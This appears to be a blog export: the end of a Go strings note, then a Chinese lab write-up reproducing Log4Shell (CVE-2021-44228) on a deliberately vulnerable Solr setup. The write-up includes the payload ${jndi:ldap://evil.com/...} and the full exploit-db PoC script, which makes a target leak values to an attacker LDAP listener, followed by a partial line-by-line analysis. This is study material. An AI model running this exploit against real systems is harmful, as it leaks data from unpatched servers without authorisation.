<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something2</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Go</code>的作者追求简洁优雅高效的代码格式，所以遇到这种形式，只能按作者的方式进行编写（无奈</p>
<h2 id="关于字符串"><a href="#关于字符串" class="headerlink" title="关于字符串"></a>关于字符串</h2><p>Go 中的<code>string</code>是一个<code>不可变的字节序列</code>，<code>不一定代表字符</code>。</p>
<p>双引号之间定义了一个字符串文字：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Jane&quot;</span></span><br></pre></td></tr></table></figure>

<p>字符串可以通过<code>+</code>运算符连接起来：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Jane&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;Austen&quot;</span></span><br><span class="line"><span class="comment">// =&gt; &quot;Jane Austen&quot;</span></span><br></pre></td></tr></table></figure>

<p>一些特殊字符需要使用前导反斜杠进行转义，例如<code>\t</code>制表符和<code>\n</code>字符串中的新行。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;How is the weather today?\nIt&#x27;s sunny&quot;</span>  </span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line"><span class="comment">// How is the weather today?</span></span><br><span class="line"><span class="comment">// It&#x27;s sunny</span></span><br></pre></td></tr></table></figure>

<p>该<code>strings</code>包包含许多用于处理字符串的有用函数。有关字符串函数的更多信息，请查看<a href="https://pkg.go.dev/strings">字符串包文档</a>。这里有些例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.ToLower returns the string given as argument with all its characters lowercased</span></span><br><span class="line">strings.ToLower(<span class="string">&quot;MaKEmeLoweRCase&quot;</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;makemelowercase&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.Repeat returns a string with a substring given as argument repeated many times</span></span><br><span class="line">strings.Repeat(<span class="string">&quot;Go&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;GoGoGo&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="字符串包（strings）"><a href="#字符串包（strings）" class="headerlink" title="字符串包（strings）"></a>字符串包（strings）</h2><h3 id="关于字符串包"><a href="#关于字符串包" class="headerlink" title="关于字符串包"></a>关于字符串包</h3><p>该<code>strings</code>包包含许多用于处理字符串的有用函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">strings.ToUpper(<span class="string">&quot;test&quot;</span>) <span class="comment">// =&gt; &quot;TEST&quot;</span></span><br></pre></td></tr></table></figure>

<p>和<code>java</code>中的包很相似</p>
<blockquote>
<p>记几个常用的</p>
<p><code>strings.Repeat(str,num)</code>：重复str字符num次</p>
<p><code>strings.TrimSpace(str)</code>：清除<code>str</code>字符串<code>左右</code>边的空格</p>
<p><code>strings.TrimLeft/TrimRight(str,sign)</code>：清除<code>str</code>字符串<code>左/右</code>边的sign符号</p>
</blockquote>
]]></content>
      <categories>
        <category>语言学习</category>
      </categories>
      <tags>
        <tag>go语言</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE漏洞学习</title>
    <url>/CVE-Test/</url>
    <content><![CDATA[<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
<span id="more"></span>

<h1 id="CVE-2021-44228-Log4j2"><a href="#CVE-2021-44228-Log4j2" class="headerlink" title="CVE-2021-44228 Log4j2"></a>CVE-2021-44228 Log4j2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>Apache Log4j2 是一个被广泛使用的开源日志记录库，2017 年 7 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 2.0-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 2021 年 11 月 24 日向 Apache 报告了该漏洞；12 月 5 日官方发布了补丁；到了 12 月 9 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</p>
</blockquote>
<blockquote>
<p>环境搭建虚拟机版本: ubuntu 20.4<br>Apache solr版本: 8.11.0</p>
</blockquote>
<h3 id="Apache-solr-8-11-0下载"><a href="#Apache-solr-8-11-0下载" class="headerlink" title="Apache solr 8.11.0下载"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>
<blockquote>
<p>Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</p>
</blockquote>
<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201005804892.png"><img src="/CVE-Test/image-20221201005804892.png" alt="image-20221201005804892"></a></p>
<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>
<p>所以该版本也存在<code>CVE-2021-44228</code></p>
<p>于是下载</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201010242171.png"><img src="/CVE-Test/image-20221201010242171.png" alt="image-20221201010242171"></a></p>
<h3 id="JAVA配置"><a href="#JAVA配置" class="headerlink" title="JAVA配置"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>
<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>
<p>但是</p>
<blockquote>
<p>高版本的JDK环境中<code>trustURLCodebase</code>变量为false，限制了远程类的加载，导致<code>JNDI</code>注入利用失败，无法反弹shell<br>能实现利用条件：版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code>。<br>但是过低版本的，solr运行可能会出错</p>
</blockquote>
<p>所以这里从官网下载专门的<code>8u171</code></p>
<h4 id="解压到对应目录"><a href="#解压到对应目录" class="headerlink" title="解压到对应目录"></a>解压到对应目录</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221161421513.png"><img src="/CVE-Test/image-20221221161421513.png" alt="image-20221221161421513"></a></p>
<h4 id="部署并修改环境变量"><a href="#部署并修改环境变量" class="headerlink" title="部署并修改环境变量"></a>部署并修改环境变量</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">在文件末尾追加下面4行内容</span><br><span class="line"><span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#使其上面环境变量设置生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221161638879.png"><img src="/CVE-Test/image-20221221161638879.png" alt="image-20221221161638879"></a></p>
<h3 id="Solr下载"><a href="#Solr下载" class="headerlink" title="Solr下载"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201111930502.png"><img src="/CVE-Test/image-20221201111930502.png" alt="image-20221201111930502"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112302036.png"><img src="/CVE-Test/image-20221201112302036.png" alt="image-20221201112302036"></a></p>
<p>然后就解压</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112554067-1671632324475-1.png"><img src="/CVE-Test/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></a></p>
<h3 id="安装-Apache-Solr服务"><a href="#安装-Apache-Solr服务" class="headerlink" title="安装 Apache Solr服务"></a>安装 <code>Apache Solr</code>服务</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112725299.png"><img src="/CVE-Test/image-20221201112725299.png" alt="image-20221201112725299"></a></p>
<p>查看服务状态</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112839632.png"><img src="/CVE-Test/image-20221201112839632.png" alt="image-20221201112839632"></a></p>
<p>发现服务已经存在</p>
<p>启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /lib/systemd/systemd-sysv-install <span class="built_in">enable</span> solr</span><br><span class="line"><span class="comment">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>

<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>
<p>查看环境搭建的虚拟机<code>ip</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201113319037.png"><img src="/CVE-Test/image-20221201113319037.png" alt="image-20221201113319037"></a></p>
<p>得到环境搭建靶机<code>ip</code>为</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>

<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p>浏览器访问</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131:8983</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220220624019.png"><img src="/CVE-Test/image-20221220220624019.png" alt="image-20221220220624019"></a></p>
<p>搭建成功</p>
<p>内网环境中的攻击机也成功访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201115827107.png"><img src="/CVE-Test/image-20221201115827107.png" alt="image-20221201115827107"></a></p>
<p>环境搭建完毕</p>
<h2 id="了解漏洞描述与注入原理"><a href="#了解漏洞描述与注入原理" class="headerlink" title="了解漏洞描述与注入原理"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>
<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>
<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>
<p>象，用于查找不同类型的值</p>
<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>
<p>消息中。</p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>
<p>先了解一下<code>JNDI</code>是什么以及其组成</p>
<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>
<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>
<blockquote>
<p>其中大致有<br>远程方法调用（<code>RMI</code>），通用对象请求代理体系结构（<code>CORBA</code>），轻型目录访问协议（<code>LDAP</code>）或域名服务（<code>DNS</code>）</p>
</blockquote>
<p>其大致组成为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//初始化默认环境</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure>

<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程恶意类，从而执行恶意类的命令，故而实现远程代码执行</strong></u></p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>
<p><strong>对于<code>payload</code></strong></p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>
<p><strong><code>JNDILookup</code>对象查找的值</strong></p>
<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>
<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>
<h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>
<p>发布时间: <code>12/12/2021</code></p>
<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221204224323306-1671800988704-1.png"><img src="/CVE-Test/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></a></p>
<p>脚本内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span></span><br><span class="line"><span class="comment"># Date: 12/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: leonjza</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 2.14.1</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-44228</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pure python ENV variable leak PoC for CVE-2021-44228</span></span><br><span class="line"><span class="comment"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 2021 @leonjza</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>

<h3 id="信息泄露脚本分析"><a href="#信息泄露脚本分析" class="headerlink" title="信息泄露脚本分析"></a>信息泄露脚本分析</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>
<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>
<p>的数据，并发送响应数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>
<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>



